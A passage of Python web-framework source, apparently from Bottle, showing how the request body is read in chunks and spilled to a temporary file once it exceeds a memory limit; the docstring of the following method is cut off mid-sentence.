                yield part
                maxread -= len(part)
            if read(2) != rn:
                raise err

    @DictProperty('environ', 'bottle.request.body', read_only=True)
    def _body(self):
        try:
            read_func = self.environ['wsgi.input'].read
        except KeyError:
            self.environ['wsgi.input'] = BytesIO()
            return self.environ['wsgi.input']
        body_iter = self._iter_chunked if self.chunked else self._iter_body
        body, body_size, is_temp_file = BytesIO(), 0, False
        for part in body_iter(read_func, self.MEMFILE_MAX):
            body.write(part)
            body_size += len(part)
            if not is_temp_file and body_size > self.MEMFILE_MAX:
                body, tmp = TemporaryFile(mode='w+b'), body
                body.write(tmp.getvalue())
                del tmp
                is_temp_file = True
        self.environ['wsgi.input'] = body
        body.seek(0)
        return body

    def _get_body_string(self, maxread):
        """ Read body into a string. Raise HTTPError(413) on requests that are
            to 
        '''







